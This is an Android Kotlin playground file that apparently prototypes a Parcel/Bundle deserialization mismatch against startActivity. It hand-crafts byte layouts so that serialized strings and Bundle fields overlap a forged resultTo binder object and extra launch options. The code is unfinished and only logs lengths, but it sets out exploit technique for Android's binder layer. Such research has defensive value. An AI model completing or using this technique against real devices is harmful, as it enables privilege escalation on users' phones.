@file:OptIn(ExperimentalUnsignedTypes::class)
@file:SuppressLint("Recycle")

package play.ground

import android.annotation.SuppressLint
import android.content.Intent
import android.os.Bundle
import android.os.Parcel
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import org.jetbrains.anko.button
import org.jetbrains.anko.intentFor
import org.jetbrains.anko.sdk27.coroutines.onClick
import org.jetbrains.anko.verticalLayout
import kotlin.streams.toList

fun UInt.repeat(n: Int) = UByteArray(n) { this.toUByte() }
fun <T> fixme(value: T) = value

const val ValByteArray = 13


class IndexActivity : AppCompatActivity() {
  companion object {
    private const val TAG = "Decay"
  }

  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    verticalLayout {
      button("compute span length") {
        onClick {
          val large = 0x11111111

          val payload = Parcel.obtain().apply {
            writeInt(large) // binder.2
            writeInt(large + 1) // cookie.1
            writeInt(large + 2) // cookie.2
            writeInt(large + 3) // representation
            writeString(null) // requestWho
            writeInt(large + 4) // requestCode
            writeInt(large + 5) // flags
            writeTypedObject(null, 0) // profiler info

            // writeTypedObject(Bundle)
            writeInt(1) // means not null
            writeInt(6) // back length
            writeInt(7) // magic
            writeInt(2) // size -> 2
            writeString("android.activity.launchTaskId") // 29
            writeInt(3) //  type_int
            writeInt(1) // value

            writeString("@") // 不 padding
            writeInt(13) // VAL_TYPE
            writeInt(14) // length

            // write the first four bytes, and terminate the string
            writeInt(0x00000000) // '@@@nil'
          }


          val str = Parcel.obtain().apply {
//            writeInt(136)
            writeInt(68)
            appendFrom(payload, 0, payload.dataSize())
          }

          str.setDataPosition(0)
          val s = str.readString()
          Log.e(TAG, "s:${s?.length}  size: ${str.dataSize()} pos: ${str.dataPosition()}")


//          val memRepresentation = payload.marshall()
//          Log.e(TAG, "mem representation: ${String(memRepresentation)}")
//          text = "${memRepresentation.size - 1}"
        }
      }

      button("compute ByteArray length") {
        onClick {

        }
      }
    }
  }


  /* the autonomy of `startActivity` call

  ```java
  int _result = this.startActivity(
    caller,
    callingPackage,
    callingFeatureId,
    intent,
      {
        mSourcePackage@String, -> resolvedType
        mLabelRes@Int, -> hdr
        _type@Int=1, -> flags
        String8@{
          ?len@Int=???, -> binder.1
          payload=bytes, binder.2, cookie, representation, resultWho, requestCode, flags, profilerInfo
            , options@{launchTaskId = 1, _ = byteArray@?len?(
            '@','@', '@', nil=?, ?paddings
            )
        }
      }
    resolvedType@String=null,
    resultTo@binder=null{
      hdr@i32,
      flags@i32,
      binder@i64,
      cookie@i64,
      representation@i32
    },
    resultWho@String=null,
    requestCode@Int=2,
    flags@Int=0,
    profilerInfo@ProfilerInfo=null,
    options@Bundle=null
  );
  ```
  */

  /* the autonomy of flatten binder
  ```cpp
  struct flat_binder_object  {
    struct binder_object_header hdr;
    u32 flags;
    union {
      u64 binder;
      u32 handle;
    }
    u64 cookie
  }
  ```
  */


  private fun decay() {
    val prologue = Parcel.obtain().apply {
      // Span.str.payload.0123 -> resultTo.binder.2@i32
      writeInt(0)

      // Span.str.payload.4567_8901 -> resultTo.binder.cookie@i64
      writeInt(0)
      writeInt(0)

      // Span.str.payload2.2345 -> resultTo.binder.representation
      writeInt(0)
    }

    val epilogue = Parcel.obtain().apply {
      writeInt(0) // i32@LabeledIntent.mIcon
      writeString(null) // resolvedType
      writeStrongBinder(null) // resultTo
      writeString(null) // resultWho
      writeInt(2) // requestCode
      writeTypedObject(null, 0) // profilerInfo
      writeTypedObject(null, 0) // options
    }

    val epilogueLength = epilogue.dataPosition()

    val `span$options$map` = Parcel.obtain().apply {
      writeInt(2) // entry size
      writeString("android.activity.launchTaskId") // first key
      writeValue(1)
      writeString("?")
      writeInt(ValByteArray)
      writeInt(fixme(epilogueLength)) // length of epilogue
    }

    val `span$options$meta` = Parcel.obtain().apply {
      writeInt(1) // options != null
      writeInt(fixme(`span$options$map`.dataPosition() + epilogueLength)) // back-patched length
      writeInt(0x4C444E42) // BNDL
    }

    val span = String(
      Parcel.obtain().apply {
        appendFrom(
          prologue,
          0,
          prologue.dataSize()
        ) // (binder.binder.2 ... binder.representation) => resultTo

        writeString(null) // resultWho
        writeInt(-1) // requestCode
        writeInt(Intent.FLAG_ACTIVITY_NEW_TASK) // flags
        writeTypedObject(null, 0) // profilerInfo
        writeTypedObject(null, 0) // options

        // other
        appendFrom(`span$options$meta`, 0, `span$options$meta`.dataSize())
        appendFrom(`span$options$map`, 0, `span$options$map`.dataSize())
      }.marshall()
    )

    Log.e(TAG, "natsuki: span -> $span")
  }

  fun handcrafted() {
    val parcel = Parcel.obtain().apply {
      val intent = intentFor<IndexActivity>()
      writeParcelable(intent, 0)
      writeString(null) // resolvedType -> mSourcePackage
      writeInt(0) //  mLabelRes -> hdr
      writeInt(1) // _type  -> flags
      writeInt(fixme(100)) // string length -> binder.1
      writeInt(0) //  -> binder.2
      writeInt(0) // cookie
      writeInt(0) // cookie
      writeInt(0) // representation


    }
  }
}



